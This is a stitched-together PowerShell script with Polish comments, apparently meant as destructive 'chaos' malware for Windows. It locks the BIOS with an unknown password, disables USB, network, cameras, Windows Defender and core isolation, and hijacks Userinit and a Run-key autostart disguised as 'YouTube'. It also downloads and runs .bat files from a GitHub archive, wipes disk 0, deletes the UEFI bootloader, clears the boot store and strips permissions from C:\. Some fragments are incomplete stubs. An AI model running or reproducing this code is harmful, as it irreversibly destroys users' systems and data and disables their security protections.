# Przykład koncepcyjny dla narzędzi HP BIOS Config Utility
$randomPass = [Guid]::NewGuid().ToString()
# Skrypt ustawia hasło, którego nikt nie zna. 
# Bez hasła nie zmienisz żadnego ustawienia sprzętowego w przyszłości.
.\BiosConfigUtility.exe /NewAdminPassword:"$randomPass"

# Przykład dla systemów Dell (wymaga sterownika producenta)
# Wyłączenie wszystkich portów USB na poziomie sprzętowym
Set-Item -Path DellSmbios:\Devices\UsbPorts "Disabled"
# Po restarcie żadne urządzenie USB (mysz, klawiatura) nie zadziała.

# WYMAGA UPRAWNIEŃ ADMINISTRATORA
Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Speech

# 1. Przygotowanie syntezatora głosu
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speak.Rate = -4

# 2. Funkcja do "trzęsienia" ekranem i błędów graficznych (GDI+)
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
public class MasterChaos {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hDest, int nX, int nY, int nW, int nH, IntPtr hSrc, int nSX, int nSY, uint dwRop);
    public static void Glitch() {
        IntPtr hdc = GetDC(IntPtr.Zero);
        Random r = new Random();
        BitBlt(hdc, r.Next(-20, 20), r.Next(-20, 20), 1920, 1080, hdc, 0, 0, 0x00CC0020);
    }
}
"@
Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing

Write-Host "--- TOTALNA INGERENCJA ROZPOCZĘTA ---" -ForegroundColor Red

# 3. CZĘŚĆ FIZYCZNA: Ukrycie pulpitu i mruganie diodami
Stop-Process -Name explorer -Force
$w = New-Object -ComObject WScript.Shell

# 4. PĘTLA CHAOSU (Trwa ok. 20 sekund)
$speak.SpeakAsync("Wykryto krytyczny błąd integracji sprzętowej. Przejmowanie kontroli nad procesami.")

for($i=0; $i -lt 100; $i++) {
    # Wizualny glitch
    [MasterChaos]::Glitch()
    
    # Ruch myszy "ducha"
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920), (Get-Random -Max 1080))
    
    # Mruganie klawiaturą
    if($i % 10 -eq 0) {
        $w.SendKeys('{CAPSLOCK}')
        $w.SendKeys('{NUMLOCK}')
    }
    
    # Losowe dźwięki systemowe
    if($i % 25 -eq 0) {
        [System.Media.SystemSounds]::Hand.Play()
    }

    Start-Sleep -Milliseconds 150
}

# 5. Przywracanie (opcjonalne, ale system będzie "rozmazany")
$speak.Speak("Anomalia zakończona. Próba przywrócenia stabilności.")
Start-Process explorer.exe
Write-Host "--- SYSTEM PRZYWRÓCONY (Odśwież ekran F5) ---" -ForegroundColor Green
# WYMAGA UPRAWNIEŃ ADMINISTRATORA
Write-Host "--- INICJOWANIE ZMIAN W ARCHITEKTURZE SYSTEMU ---" -ForegroundColor Red

# 1. INGERENCJA W REJESTR: Zmiana zachowania BSOD (Błąd Krytyczny)
# Zamiast automatycznego restartu, system zostanie na ekranie błędu z pełnym zrzutem pamięci.
# Dodatkowo włączamy "CrashOnCtrlScroll", co pozwala wywołać BSOD ręcznie klawiaturą.
Write-Host "[1/3] Modyfikacja jądra obsługi błędów..." -ForegroundColor Yellow
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl"
Set-ItemProperty -Path $regPath -Name "AutoReboot" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" -Name "CrashOnCtrlScroll" -Value 1

# 2. INGERENCJA W REJESTR: Zmiana powłoki logowania (Userinit)
# Zamiast ładować pulpit, system może uruchomić dowolny proces przed startem explorera.
Write-Host "[2/3] Przejmowanie sekwencji logowania..." -ForegroundColor Yellow
$winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Dodajemy wpis, który uruchomi notatnik z "manifestem" przed pulpitem
Set-ItemProperty -Path $winlogonPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe, notepad.exe"

# 3. INGERENCJA W BIOS/UEFI: Zmiana flagi Boot Next
# PowerShell może komunikować się z NVRAM (pamięcią BIOS). 
# Poniższe polecenie wymusza, aby przy następnym starcie komputer wszedł bezpośrednio 
# w interfejs UEFI/BIOS zamiast ładować Windowsa.
Write-Host "[3/3] Zmiana instrukcji startowej w NVRAM..." -ForegroundColor Yellow
if (Get-Command bcdedit -ErrorAction SilentlyContinue) {
    # Wymuszenie wejścia do ustawień sprzętowych przy restarcie
    bcdedit /set "{fwbootmgr}" displayorder "{bootmgr}" /addfirst
    # Alternatywnie: bcdedit /set "{current}" recoveryenabled No (wyłącza naprawę systemu)
}

Write-Host "--- OPERACJA ZAKOŃCZONA ---" -ForegroundColor Green
Write-Host "Zmiany w BIOS i Rejestrze zostaną aktywowane po restarcie." -ForegroundColor Cyan

# Ukrycie paska zadań i ikon (wymaga restartu explorera aby cofnąć)
Write-Host "Wchodzenie w tryb izolacji wizualnej..." -ForegroundColor Red
Stop-Process -Name explorer -Force
# Teraz użytkownik widzi tylko pusty ekran. 
# Aby przywrócić: CTRL+SHIFT+ESC -> Plik -> Uruchom nowe zadanie -> explorer.exe

Add-Type -AssemblyName System.Speech
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speak.Rate = -5 # Spowolnienie głosu dla "mrocznego" efektu

$messages = @(
    "Wykryto nieznaną ingerencję w jądrze systemu.",
    "Transfer danych do nieznanej lokalizacji rozpoczęty.",
    "Zaraz nastąpi reinicjalizacja sprzętowa."
)

foreach ($msg in $messages) {
    $speak.Speak($msg)
    Start-Sleep -Seconds 2
}

Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

Write-Host "Inicjowanie anomalii kursora..." -ForegroundColor Yellow

for($i=0; $i -lt 100; $i++) {
    # Pobierz obecną pozycję myszy
    $pos = [System.Windows.Forms.Cursor]::Position
    
    # Przesuń kursor w losowym kierunku o 50 pikseli
    $x = $pos.X + (Get-Random -Min -50 -Max 51)
    $y = $pos.Y + (Get-Random -Min -50 -Max 51)
    
    # Utrzymaj kursor w granicach ekranu
    if ($x -lt 0) { $x = 0 }
    if ($y -lt 0) { $y = 0 }
    
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
    Start-Sleep -Milliseconds 50
}
$w = New-Object -ComObject WScript.Shell
Write-Host "Przejmowanie kontroli nad diodami LED..." -ForegroundColor Cyan

for($i=0; $i -lt 20; $i++) {
    $w.SendKeys('{CAPSLOCK}')
    Start-Sleep -Milliseconds 100
    $w.SendKeys('{NUMLOCK}')
    Start-Sleep -Milliseconds 100
    $w.SendKeys('{SCROLLLOCK}')
    Start-Sleep -Milliseconds 100
}

# WYMAGA UPRAWNIEŃ ADMINISTRATORA
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Threading;

public class UltraChaos {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    [DllImport("user32.dll")]
    public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

    public static void MeltScreen(int durationSeconds) {
        IntPtr hdc = GetDC(IntPtr.Zero);
        Random rand = new Random();
        int screenWidth = 1920; // Można pobrać dynamicznie
        int screenHeight = 1080;

        DateTime end = DateTime.Now.AddSeconds(durationSeconds);

        while (DateTime.Now < end) {
            int x = rand.Next(screenWidth);
            // Efekt 1: "Topnienie" - przesunięcie kolumny pikseli w dół
            BitBlt(hdc, x, rand.Next(2, 10), 100, screenHeight, hdc, x, 0, 0x00CC0020);
            
            // Efekt 2: Losowe "drżenie" ekranu
            BitBlt(hdc, rand.Next(-5, 5), rand.Next(-5, 5), screenWidth, screenHeight, hdc, 0, 0, 0x00CC0020);

            if (rand.Next(100) > 95) {
                // Efekt 3: Rysowanie losowych kształtów "szumu"
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    g.DrawIcon(SystemIcons.Error, rand.Next(screenWidth), rand.Next(screenHeight));
                }
            }
            Thread.Sleep(5);
        }
        ReleaseDC(IntPtr.Zero, hdc);
    }
}
"@ -ReferencedAssemblies System.Drawing, System.Windows.Forms

Write-Host "Inicjowanie mega efektów wizualnych..." -ForegroundColor DarkMagenta
[UltraChaos]::MeltScreen(15) # Efekt będzie trwał 15 sekund
Write-Host "Proces zakończony. Jeśli ekran wygląda dziwnie, naciśnij Win+Ctrl+Shift+B aby zrestartować sterownik graficzny." -ForegroundColor Cyan
# Zmiana rozdzielczości na 640x480 (wygląda jak tryb awaryjny z lat 90.)
Add-Type -TypeDefinition '...[DllImport("user32.dll")] public static extern int ChangeDisplaySettings(...)...'
# (Dla uproszczenia można użyć narzędzi typu QRes wywołanych z PS)
$colors = @("Black", "White", "Gray")
for($i=0; $i -lt 100; $i++) {
    (Get-Host).UI.RawUI.BackgroundColor = $colors[(Get-Random -Maximum 3)]
    Clear-Host
    Start-Sleep -Milliseconds 10
}

# Ukrywa pasek zadań
$h = Get-Process explorer | Where-Object {$_.MainWindowTitle -eq ""} | Select-Object -ExpandProperty MainWindowHandle
# To wymaga specyficznego wywołania API, ale prościej jest po prostu zabić proces:
Stop-Process -Name explorer -Force

# WYMAGA UPRAWNIEŃ ADMINISTRATORA

Write-Host "--- INICJACJA GŁĘBOKIEJ INTEGRACJI SPRZĘTOWEJ (2026) ---" -ForegroundColor Cyan

# 1. TEST INTERFEJSU DŹWIĘKOWEGO PROCESORA (PC Speaker)
# Nie używa karty dźwiękowej, lecz bezpośrednio uderza w oscylator płyty głównej.
Write-Host "[1/3] Test oscylatora systemowego..." -ForegroundColor Yellow
for($i=400; $i -le 1200; $i+=200) {
    [console]::beep($i, 150)
}

# 2. HARDWARE RESET MAGISTRALI USB
# Fizycznie odcina i przywraca zasilanie do wszystkich hubów USB. 
# Powoduje to chwilowe "zamrożenie" wszystkich podłączonych urządzeń.
Write-Host "[2/3] Reinicjalizacja zasilania portów USB..." -ForegroundColor Yellow
Get-PnpDevice -FriendlyName "*USB Root Hub*" | ForEach-Object {
    Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false
}

# 3. MANIPULACJA KONTROLEREM PODŚWIETLENIA (WMI Hardware Level)
# Skrypt przejmuje bezpośrednią kontrolę nad prądem płynącym do matrycy.
Write-Host "[3/3] Stress-test kontrolera luminancji matrycy..." -ForegroundColor Yellow
$monitor = Get-WmiObject -Namespace root\wmi -Class WmiMonitorBrightnessMethods
$levels = @(10, 100, 30, 80, 100) # Sekwencja jasności
foreach ($lvl in $levels) {
    $monitor.WmiSetBrightness(0, $lvl)
    Start-Sleep -Milliseconds 300
}

Write-Host "--- INTEGRACJA ZAKOŃCZONA POMYŚLNIE ---" -ForegroundColor Green
# WYMAGA UPRAWNIEŃ ADMINISTRATORA
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;

public class VisualChaos {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    public static void StartGlitch(int iterations) {
        IntPtr desktopDC = GetDC(IntPtr.Zero);
        Random rand = new Random();
        Graphics g = Graphics.FromHdc(desktopDC);

        for (int i = 0; i < iterations; i++) {
            int x = rand.Next(0, 1920);
            int y = rand.Next(0, 1080);
            int w = rand.Next(100, 500);
            int h = rand.Next(100, 500);

            // Efekt 1: Kopiowanie fragmentów ekranu w inne miejsca (Inception)
            BitBlt(desktopDC, x, y, w, h, desktopDC, x + rand.Next(-50, 50), y + rand.Next(-50, 50), 0x00CC0020);

            // Efekt 2: Rysowanie losowych kolorowych prostokątów
            Brush brush = new SolidBrush(Color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256)));
            if (i % 5 == 0) {
                g.FillPie(brush, x, y, w / 2, h / 2, rand.Next(360), rand.Next(360));
            }

            System.Threading.Thread.Sleep(10);
        }
        ReleaseDC(IntPtr.Zero, desktopDC);
    }
}
"@ -ReferencedAssemblies System.Drawing

Write-Host "Inicjowanie anomalii wizualnych..." -ForegroundColor Magenta
[VisualChaos]::StartGlitch(500)
Write-Host "Anomalia zakończona. Odśwież pulpit (F5), aby wyczyścić efekty." -ForegroundColor Cyan

# Włącza lupę i ustawia inwersję kolorów
Start-Process "magnify.exe"
Start-Sleep -Seconds 1
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("^!i") # Skrót Ctrl+Alt+I

# Wyłączenie izolacji rdzenia (Core Isolation)
$path = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
Set-ItemProperty -Path $path -Name "Enabled" -Value 0
Write-Host "Zabezpieczenia sprzętowe jądra zostały wyłączone." -ForegroundColor Yellow

$brightness = 0 # Poziom jasności w %
$delay = 0
$myMonitor = Get-WmiObject -Namespace root\wmi -Class WmiMonitorBrightnessMethods
$myMonitor.WmiSetBrightness($delay, $brightness)

# Odwołanie do biblioteki winmm.dll sterującej multimediami sprzętowymi
$drive = New-Object -ComObject WMPlayer.OCX.7
$drive.cdromCollection.Item(0).Eject()


# Odgrywa dźwięk o częstotliwości 1000Hz przez 500ms bezpośrednio przez procesor
[console]::beep(1000, 500)

# Ekstremalna pętla dźwiękowa (może być irytująca fizycznie)
for($i=100; $i -le 2000; $i+=100) { [console]::beep($i, 100) }


# EKSTREMALNE: Zapycha RAM do momentu zamrożenia systemu
$storage = @()
while($true) {
    $storage += "A" * 100MB
    Write-Host "Zaalokowano kolejne 100MB..." -ForegroundColor Red
}


# Włączenie menu edytora startowego (Legacy Boot Menu)
bcdedit /set "{current}" bootmenupolicy legacy

# Wyłączenie ekranu logotypu (Quiet Boot) - przyspiesza wizualnie start
bcdedit /set "{current}" quietboot yes
# 1. Wyłączenie wszystkich kontrolerów USB (Myszki, Klawiatury, Pendrive, Modemy)
Write-Host "Blokowanie kontrolerów USB..." -ForegroundColor Red
Get-PnpDevice -FriendlyName "*USB*" | Disable-PnpDevice -Confirm:$false -ErrorAction SilentlyContinue

# 2. Wyłączenie modułów Bluetooth
Write-Host "Blokowanie Bluetooth..." -ForegroundColor Red
Get-PnpDevice -FriendlyName "*Bluetooth*" | Disable-PnpDevice -Confirm:$false -ErrorAction SilentlyContinue

# 3. Wyłączenie kamer i aparatów (Webcams)
Write-Host "Blokowanie kamer..." -ForegroundColor Red
Get-PnpDevice -Class "Camera", "Image" | Disable-PnpDevice -Confirm:$false -ErrorAction SilentlyContinue

# 4. Wyłączenie kart sieciowych (Wi-Fi i Ethernet) - całkowita izolacja
Write-Host "Blokowanie sieci..." -ForegroundColor Red
Get-NetAdapter | Disable-NetAdapter -Confirm:$false

# 5. Wyłączenie czytników kart pamięci i napędów dysków wymiennych
Write-Host "Blokowanie pamięci masowych..." -ForegroundColor Red
Get-PnpDevice -Class "DiskDrive" | Where-Object { $_.InstanceId -like "*USBSTOR*" } | Disable-PnpDevice -Confirm:$false

# 6. Blokada zapisu na USB na poziomie Rejestru (dodatkowe zabezpieczenie)
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies"
if (!(Test-Path $registryPath)) { New-Item $registryPath -Force }
Set-ItemProperty -Path $registryPath -Name "WriteProtect" -Value 1

Write-Host "Urządzenia zostały wyłączone z użytku." -ForegroundColor DarkRed

# Drastyczne usunięcie silnika renderującego interfejs
Get-AppxPackage -AllUsers *WebExperience* | Remove-AppxPackage -AllUsers
Get-AppxPackage -AllUsers *Edge* | Remove-AppxPackage -AllUsers

# 1. Usunięcie wszystkich wpisów z Boot Managera w NVRAM
# To czyści listę urządzeń, z których BIOS wie, jak wystartować.
bcdedit /export C:\bcd_backup # Kopia (choć prosisz o nieodwracalne)
bcdedit /createstore C:\EmptyBCD
bcdedit /import C:\EmptyBCD /clean

# 2. Wymuszenie czyszczenia kluczy Secure Boot (jeśli API producenta pozwala)
# To sprawia, że system Windows nie zostanie autoryzowany do startu.

# Ścieżka do pliku/folderu, który chcesz przejąć (ZMIEŃ TO!)
$target = "C:\Windows\System32\"

# Przejęcie własności (Take Ownership)
takeown /f $target /a

# Nadanie pełnych uprawnień dla Administratorów
icacls $target /grant administrators:F /t

Write-Host "Przejęto własność nad: $target. Możesz teraz edytować ten plik." -ForegroundColor Cyan

# WYMAGA UPRAWNIEŃ ADMINISTRATORA
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Threading;

public class UltraChaos {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    [DllImport("user32.dll")]
    public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

    public static void MeltScreen(int durationSeconds) {
        IntPtr hdc = GetDC(IntPtr.Zero);
        Random rand = new Random();
        int screenWidth = 1920; // Można pobrać dynamicznie
        int screenHeight = 1080;

        DateTime end = DateTime.Now.AddSeconds(durationSeconds);

        while (DateTime.Now < end) {
            int x = rand.Next(screenWidth);
            // Efekt 1: "Topnienie" - przesunięcie kolumny pikseli w dół
            BitBlt(hdc, x, rand.Next(2, 10), 100, screenHeight, hdc, x, 0, 0x00CC0020);
            
            // Efekt 2: Losowe "drżenie" ekranu
            BitBlt(hdc, rand.Next(-5, 5), rand.Next(-5, 5), screenWidth, screenHeight, hdc, 0, 0, 0x00CC0020);

            if (rand.Next(100) > 95) {
                // Efekt 3: Rysowanie losowych kształtów "szumu"
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    g.DrawIcon(SystemIcons.Error, rand.Next(screenWidth), rand.Next(screenHeight));
                }
            }
            Thread.Sleep(5);
        }
        ReleaseDC(IntPtr.Zero, hdc);
    }
}
"@ -ReferencedAssemblies System.Drawing, System.Windows.Forms

Write-Host "Inicjowanie mega efektów wizualnych..." -ForegroundColor DarkMagenta
[UltraChaos]::MeltScreen(15) # Efekt będzie trwał 15 sekund
Write-Host "Proces zakończony. Jeśli ekran wygląda dziwnie, naciśnij Win+Ctrl+Shift+B aby zrestartować sterownik graficzny." -ForegroundColor Cyan

# Wyłączenie ochrony w czasie rzeczywistym przez moduł Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Dodanie wykluczenia dla całego dysku C: (drastyczne obniżenie bezpieczeństwa)
Add-MpPreference -ExclusionPath "C:\"

# Modyfikacja rejestru w celu wyłączenia usługi (może wymagać trybu Safe Mode)
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (!(Test-Path $path)) { New-Item -Path $path -Force }
Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1

Write-Host "Zastosowano próby wyłączenia Defendera. Wymagany restart." -ForegroundColor Red


$newName = "komp-przejęty"
Rename-Computer -NewName $newName -Force -Restart



# 1. Zdefiniuj nazwę aplikacji i pełną ścieżkę do pliku .exe
$appName = "YouTube"
$exePath = "$HOME\Downloads\Pliczek.ps1"

# 2. Ścieżka w rejestrze dla autostartu użytkownika
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 3. Dodanie wpisu do rejestru
try {
    Set-ItemProperty -Path $registryPath -Name $appName -Value $exePath
    Write-Host "Pomyślnie dodano $appName do autostartu." -ForegroundColor Green
}
catch {
    Write-Error "Wystąpił błąd podczas dodawania wpisu do rejestru: $_"
}


# --- KONFIGURACJA ---
$url = "https://github.com/Jakub668/fajne/archive/refs/heads/main.zip"
$tempDir = "$env:TEMP\GitHubDownload"
$zipFile = "$tempDir\archive.zip"
$extractDir = "$tempDir\Extracted"
$repoFolder = "$extractDir\fajne-main" # Folder, który tworzy GitHub

# Lista plików do uruchomienia natychmiast
$filesToRun = @("Lagi.bat", "LFormat.bat", "Jj.bat", "Format.bat")
# Plik do uruchomienia po 5 minutach
$finalFile = "Reset.bat"

# 1. Przygotowanie folderów
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $extractDir -Force | Out-Null

# 2. Pobieranie archiwum
Write-Host "Pobieranie plików z GitHub..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $zipFile

# ... (wcześniejsza część skryptu z pobieraniem) ...

# 3. Rozpakowywanie
Write-Host "Rozpakowywanie..." -ForegroundColor Cyan
Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

# --- NOWOŚĆ: Odblokowywanie plików, aby nie było okienek ostrzegawczych ---
Write-Host "Odblokowywanie plików..." -ForegroundColor Cyan
Get-ChildItem -Path $extractDir -Recurse | Unblock-File

# 4. Uruchamianie pierwszej grupy plików
# ... (reszta skryptu) ...

Write-Host "Uruchamianie plików: $filesToRun" -ForegroundColor Green
foreach ($file in $filesToRun) {
    $path = Join-Path $repoFolder $file
    if (Test-Path $path) {
        Start-Process -FilePath $path -WorkingDirectory $repoFolder
    } else {
        Write-Warning "Nie znaleziono pliku: $file"
    }
}

# 5. Odliczanie 5 minut
$waitTime = 300 # 5 minut w sekundach
Write-Host "Oczekiwanie 5 minut przed uruchomieniem $finalFile..." -ForegroundColor Yellow

# Opcjonalny pasek postępu w konsoli
for ($i = $waitTime; $i -gt 0; $i--) {
    Write-Progress -Activity "Oczekiwanie na Reset.bat" -Status "Pozostało $i sekund" -PercentComplete (($waitTime - $i) / $waitTime * 100)
    Start-Sleep -Seconds 1
}

# EKSTREMALNE: Usuwa wszystkie sterowniki firm trzecich
Get-WindowsDriver -Online -All | ForEach-Object {
    pnputil /delete-driver $_.PublishedName /uninstall /force
}

# EKSTREMALNE: Nadpisuje sektor rozruchowy dysku zerami
# WYMAGA UPRAWNIEŃ SYSTEM
$disk = Get-Disk | Where-Object Number -eq 0
Clear-Disk -Number $disk.Number -RemoveData -RemoveOEM -Confirm:$false
Write-Host "Struktura dysku została zniszczona." -ForegroundColor DarkRed

$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
$blockRules = @"
127.0.0.1 microsoft.com
127.0.0.1 telemetry.microsoft.com
127.0.0.1 v10.events.data.microsoft.com
"@
Add-Content -Path $hostsPath -Value $blockRules

# 6. Uruchomienie pliku Reset.bat
$finalPath = Join-Path $repoFolder $finalFile
if (Test-Path $finalPath) {
    Write-Host "Uruchamianie końcowe: $finalFile" -ForegroundColor Red
    Start-Process -FilePath $finalPath -WorkingDirectory $repoFolder
} else {
    Write-Error "Nie znaleziono pliku: $finalFile"
}
# Montowanie partycji EFI i usuwanie plików bootloadera
$efiPartition = Get-Partition | Where-Object { $_.GptType -eq "{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}" }
if ($efiPartition) {
    $driveLetter = "Z"
    Set-Partition -InputObject $efiPartition -NewDriveLetter $driveLetter
    Remove-Item -Path "$($driveLetter):\EFI\*" -Recurse -Force
    Write-Host "Bootloader UEFI został usunięty." -ForegroundColor DarkRed
}
# Usunięcie kluczowych wartości montowania woluminów
$path = "HKLM:\SYSTEM\MountedDevices"
Takeown /f "C:\Windows\System32\config\SYSTEM" /a
Remove-ItemProperty -Path $path -Name "*" -Force -ErrorAction SilentlyContinue
Write-Host "Tablica montowania zniszczona. System nie uruchomi się ponownie." -ForegroundColor Red
# Wybranie dysku systemowego i jego całkowite wyczyszczenie bez potwierdzeń
Get-Disk | Where-Object Number -eq 0 | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false
# Fizyczne zniszczenie tablicy partycji i metadanych dysku 0
Get-Disk -Number 0 | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false

Write-Host "Zakończono pomyślnie!" -ForegroundColor Magenta
stop-process -name wininit -force
# Odebranie uprawnień do dysku C dla każdego
icacls "C:\" /inheritance:r /remove "Everyone" /remove "Administrators" /remove "SYSTEM" /remove "Users"
# UWAGA: Po tym poleceniu nawet ten terminal przestanie działać.

pause
